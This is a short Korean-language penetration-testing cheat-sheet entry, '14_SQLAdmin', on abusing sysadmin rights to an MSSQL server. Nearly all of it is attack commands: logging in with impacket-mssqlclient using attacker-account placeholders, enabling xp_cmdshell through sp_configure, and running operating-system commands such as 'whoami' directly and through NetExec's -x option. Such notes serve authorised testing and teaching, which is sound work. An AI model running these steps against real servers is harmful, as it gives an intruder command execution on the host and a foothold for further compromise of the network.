# 14_SQLAdmin

MSSQL 서버에 SA(System Administrator) 권한으로 접근 가능하다.

```bash
# MSSQL 접근 (포트 1433)
impacket-mssqlclient <도메인>/<공격자계정>:'<패스워드>'@<대상IP>  # ← 수정

# xp_cmdshell 활성화 후 OS 명령 실행
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';

nxc mssql <대상IP> -u <공격자계정> -p '<패스워드>' -x 'whoami'
```